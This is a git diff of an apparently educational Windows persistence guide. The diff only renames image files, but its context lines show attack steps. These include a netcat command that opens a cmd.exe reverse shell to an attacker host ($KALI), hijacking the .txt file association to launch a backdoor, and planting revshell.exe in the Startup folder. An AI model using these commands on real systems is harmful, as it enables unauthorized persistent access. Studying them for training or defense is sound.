@@ -238,7 +238,7 @@ Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe $KALI 4445"
 nc -lvp 4445
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (2) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Hijacking File Associations
 
@@ -250,7 +250,7 @@ The default operating system file associations are kept inside the registry, whe
 
 We can then search for a subkey for the corresponding ProgID (also under HKLM\Software\Classes), in this case, txtfile, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under shell\open\command where the default command to be run for files with that extension is specified.
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1.
 
@@ -538,7 +538,7 @@ copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
 
 Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open).
 
-<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 And log back via RDP. You should immediately receive a connection back to your attacker's machine.
 
